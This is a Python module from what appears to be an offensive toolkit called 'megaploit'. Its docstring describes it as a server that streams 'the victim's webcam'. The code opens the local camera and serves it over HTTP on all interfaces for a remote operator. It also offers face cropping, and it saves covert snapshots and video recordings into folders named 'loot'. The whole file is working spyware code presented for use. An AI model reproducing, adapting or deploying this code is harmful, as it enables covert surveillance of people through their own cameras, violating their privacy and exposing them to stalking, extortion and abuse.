"""
megaploit.streaming.webcam
~~~~~~~~~~~~~~~~~~~~~~~~~~
Flask MJPEG server — streams the victim's webcam with optional filters
(greyscale, negative, face-crop) and server-side video recording.
Accessible at http://<agent-ip>:5001
"""

from __future__ import annotations

import datetime
import os
import threading
import time

import cv2
import numpy as np
from flask import Flask, Response, render_template, request

_TEMPLATE_DIR = os.path.join(os.path.dirname(__file__), "templates")
app = Flask(__name__, template_folder=_TEMPLATE_DIR)

# ---------------------------------------------------------------------------
# Face-detection model (optional)
# ---------------------------------------------------------------------------

_MODEL_DIR  = os.path.join(os.path.dirname(__file__), "..", "..", "saved_model")
_PROTO      = os.path.join(_MODEL_DIR, "deploy.prototxt.txt")
_WEIGHTS    = os.path.join(_MODEL_DIR, "res10_300x300_ssd_iter_140000.caffemodel")

try:
    _net = cv2.dnn.readNetFromCaffe(_PROTO, _WEIGHTS)
    _FACE_AVAIL = True
except Exception:
    _net = None
    _FACE_AVAIL = False

# ---------------------------------------------------------------------------
# State
# ---------------------------------------------------------------------------

_lock       = threading.Lock()
_cam: cv2.VideoCapture | None = None
_grey       = False
_neg        = False
_face       = False
_rec_active = False
_rec_frame: np.ndarray | None = None
_rec_writer: cv2.VideoWriter | None = None
_rec_thread: threading.Thread | None = None


def _get_cam() -> cv2.VideoCapture:
    global _cam
    with _lock:
        if _cam is None or not _cam.isOpened():
            _cam = cv2.VideoCapture(0)
    return _cam


def _release_cam() -> None:
    global _cam
    with _lock:
        if _cam is not None:
            _cam.release()
            _cam = None


# ---------------------------------------------------------------------------
# Face detection
# ---------------------------------------------------------------------------

def _crop_face(frame: np.ndarray) -> np.ndarray:
    if not _FACE_AVAIL or _net is None:
        return frame
    h, w = frame.shape[:2]
    blob = cv2.dnn.blobFromImage(
        cv2.resize(frame, (300, 300)), 1.0, (300, 300), (104.0, 177.0, 123.0)
    )
    _net.setInput(blob)
    dets = _net.forward()
    if dets[0, 0, 0, 2] < 0.5:
        return frame
    box  = dets[0, 0, 0, 3:7] * np.array([w, h, w, h])
    x1, y1, x2, y2 = box.astype(int)
    crop = frame[y1:y2, x1:x2]
    if crop.size == 0:
        return frame
    r = 480 / float(crop.shape[0])
    return cv2.resize(crop, (int(crop.shape[1] * r), 480))


# ---------------------------------------------------------------------------
# Recording
# ---------------------------------------------------------------------------

def _rec_worker(writer: cv2.VideoWriter) -> None:
    global _rec_active, _rec_frame
    while _rec_active:
        time.sleep(0.05)
        if _rec_frame is not None:
            writer.write(_rec_frame)


# ---------------------------------------------------------------------------
# Frame generator
# ---------------------------------------------------------------------------

def _frames():
    global _rec_frame
    cam = _get_cam()
    while True:
        ok, frame = cam.read()
        if not ok:
            time.sleep(0.05)
            continue

        if _face:
            frame = _crop_face(frame)
        if _grey:
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
            frame = cv2.cvtColor(frame, cv2.COLOR_GRAY2BGR)
        if _neg:
            frame = cv2.bitwise_not(frame)

        if _rec_active:
            _rec_frame = frame.copy()
            cv2.putText(frame, "REC", (10, 30),
                        cv2.FONT_HERSHEY_SIMPLEX, 1, (0, 0, 255), 2)

        flipped = cv2.flip(frame, 1)
        ret, buf = cv2.imencode(".jpg", flipped)
        if not ret:
            continue
        yield (
            b"--frame\r\n"
            b"Content-Type: image/jpeg\r\n\r\n" + buf.tobytes() + b"\r\n"
        )


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@app.route("/")
def index():
    return render_template("webcam.html")


@app.route("/video_feed")
def video_feed():
    return Response(_frames(), mimetype="multipart/x-mixed-replace; boundary=frame")


@app.route("/control", methods=["POST"])
def control():
    global _grey, _neg, _face, _rec_active, _rec_writer, _rec_thread
    action = request.form.get("action", "")

    if action == "capture":
        cam = _get_cam()
        ret, frame = cam.read()
        if ret:
            os.makedirs("loot/screenshots", exist_ok=True)
            ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            cv2.imwrite(f"loot/screenshots/webcam_{ts}.png", frame)

    elif action == "toggle_grey":
        _grey = not _grey

    elif action == "toggle_neg":
        _neg = not _neg

    elif action == "toggle_face":
        _face = not _face

    elif action == "toggle_cam":
        if _get_cam().isOpened():
            _release_cam()
        else:
            _get_cam()

    elif action == "toggle_rec":
        if not _rec_active:
            _rec_active = True
            ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            fourcc = cv2.VideoWriter_fourcc(*"XVID")
            os.makedirs("loot/recordings", exist_ok=True)
            _rec_writer = cv2.VideoWriter(
                f"loot/recordings/webcam_{ts}.avi", fourcc, 20.0, (640, 480)
            )
            _rec_thread = threading.Thread(
                target=_rec_worker, args=(_rec_writer,), daemon=True
            )
            _rec_thread.start()
        else:
            _rec_active = False
            if _rec_thread:
                _rec_thread.join(timeout=2)
            if _rec_writer:
                _rec_writer.release()
                _rec_writer = None

    return "", 204   # No Content


def start_server(host: str = "0.0.0.0", port: int = 5001) -> None:
    app.run(host=host, port=port, debug=False, use_reloader=False)


if __name__ == "__main__":
    start_server()
